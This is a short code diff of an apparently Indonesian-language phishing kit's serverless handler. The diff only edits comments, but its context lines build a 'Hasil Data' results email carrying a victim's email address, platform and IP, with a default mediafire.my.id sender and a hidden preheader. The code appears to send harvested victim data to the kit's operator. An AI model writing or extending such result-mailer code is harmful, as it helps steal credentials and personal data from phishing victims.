@@ -59,12 +59,10 @@ export default async function handler(req, res) {
         if (!EMAIL_PENGIRIM || EMAIL_PENGIRIM === "") EMAIL_PENGIRIM = "hasilress@mediafire.my.id";
 
         const flag = countryFlag(COUNTRY_CODE);
-        
-        // SUBJECT EMAIL DINAMIS (BENDERA & KODE NEGARA)
         const subjectEmail = `${flag} ${DIAL_CODE} - Hasil Data [${PLATFORM}] | Pemilik (${d.email || "-"})`;
         const HEADER_EMAIL = "WEB KENZO";
 
-        // DESAIN CYBERPUNK NEON
+        // DESAIN CYBERPUNK
         const htmlBody = `
         <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">HATI HATI DENGAN WEB YANG MENGATAS NAMAKAN KENZ | IP ${d.ip || "-"}</div>
         <div style="font-family: 'Courier New', Courier, monospace; background-color: #0f172a; padding: 40px 15px;">
